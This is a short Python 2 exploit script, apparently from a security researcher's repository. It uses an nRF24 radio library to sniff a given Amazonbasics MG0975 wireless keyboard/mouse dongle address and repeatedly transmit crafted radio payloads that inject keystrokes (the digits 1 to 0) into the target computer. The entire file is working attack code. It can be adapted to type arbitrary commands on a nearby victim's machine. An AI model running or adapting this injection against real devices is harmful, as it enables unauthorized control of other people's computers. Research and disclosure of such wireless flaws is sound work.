#!/usr/bin/env python2
'''
Author: xswxm
Blog: xswxm.com

Send payloads 1,2,3,4,5,6,7,8,9,0 to Amazonbasics MG0975 dongle continuously
e.g.: sudo python exp_attacker.py -l -a 61:8E:9C:CD:03 -f 74 -n 200

'''
import logging, time
from lib import common
common.init_args('./exp_attacker.py')
common.parser.add_argument('-a', '--address', type=str, help='Address to sniff, following as it changes channels', required=True)
common.parser.add_argument('-f', '--channel', type=int, help='RF channel', default=0)
common.parser.add_argument('-n', '--times', type=int, help='Replay times', default=0)
common.parse_and_init()

channel = common.args.channel
n = common.args.times

# 0x27 represents 'a' in this case
p = 0x27

# Parse the prefix address
address = common.args.address.replace(':', '').decode('hex')[::-1][:5]
# Put the radio in sniffer mode (ESB w/o auto ACKs)
common.radio.enter_sniffer_mode(address)
# Set channel
common.radio.set_channel(channel)


# payloads = []
# payloads.append('0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0000000000')
# payloads.append('0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0000000000')
# payloads.append('0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0001000600')
# payloads.append('0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0000005200')
# payloads.append('0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0000005800')
# payloads.append('0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0000000000')
# payloads.append('0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0000000000')

# for payload in payloads:
#   common.radio.transmit_payload(payload.decode('hex'))
#   time.sleep(0.025)

time.sleep(2)



for i in range(n):
  p = p == 0x27 and 0x1E or p+1
  payload = '0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F000000' + '{:02X}'.format(p) + '00'
  common.radio.transmit_payload(payload.decode('hex'))
  time.sleep(0.025)


time.sleep(5)
payload = '0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0000000000'
common.radio.transmit_payload(payload.decode('hex'))
common.radio.transmit_payload(payload.decode('hex'))
common.radio.transmit_payload(payload.decode('hex'))